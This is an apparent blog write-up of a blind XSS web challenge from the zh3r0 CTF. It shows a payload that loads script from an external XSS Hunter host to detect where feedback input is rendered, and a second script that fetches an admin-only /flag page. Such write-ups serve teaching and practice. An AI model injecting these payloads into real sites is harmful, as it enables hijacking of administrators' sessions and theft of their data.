			<h2>Intro</h2>
			<p>	Me and my team participated in the zh3r0 CTF held recently. We ended up doing decent for a novice group and landed a position 134 out of 509 participating teams. This particular web challenge bxxs was based on something known as "Blind XSS injection". I got a premonition of this right by the name of the challenge which is basically the short form of "Blind xss injection". Once I had this premonition I went on to explore more on "Blind XSS"</p>
			<h2>Blind XSS injection</h2>
			<p> In a blind XSS injection the user is permitted to send a request on a particular webpage and that particular request is processed on another webpage therefore a user has no way to know weather or not there is an XSS vulnerability just by clicking the submit button on the first webpage. The strategy in these cases is to use an external server and pass some sort of a payload which when processed makes a hit on the external server which I would be controlling and from that hit I can figure out the page at which the request is being processed. You can either setup your own server or you can use the tool <a href="https://xsshunter.com/">XSS hunter</a>.</p>
			<h2>The exploit</h2>
			<p> On the feedback page we are presented with the following </p> 
			<img class="img-fluid h-50" src="http://iamayushanand.github.io/assets/images/7jun2020/picone.png" alt="page">

			<p> By passing the payload &quot;&gt;&lt;script src=https://ayushsubdom.xss.ht&gt;&lt;/script&gt; on the feedback page and looking at the xsshunter dashboard we see a trigger by the page at /Secret_admin_cookie_panel.</p>
			
			<p> Now we enter alert(1); payload for testing purposes and visit the /Secret_admin_cookie_panel page and see that the script has been executed. Also directory search by gobuster gives us a page /flag which can only be seen by admins. Next we just craft a payload that can visit the site at /flag and put it in alert box.</p>
			<p>The payload is &lt;script&gt;function httpGet(theUrl) &nbsp; { &nbsp; &nbsp; var xmlHttp = null; &nbsp; &nbsp; &nbsp;xmlHttp = new XMLHttpRequest(); &nbsp; &nbsp; xmlHttp.open( &quot;GET&quot;, theUrl, false ); &nbsp; &nbsp; xmlHttp.send( null ); &nbsp; &nbsp; return xmlHttp.responseText; &nbsp; } &nbsp; alert(httpGet(&quot;http://web.zh3r0.cf:3333/flag&quot;));&lt;/script&gt; </p>
			<br>
			<p> then we get the following alert and the ctf is solved</p>
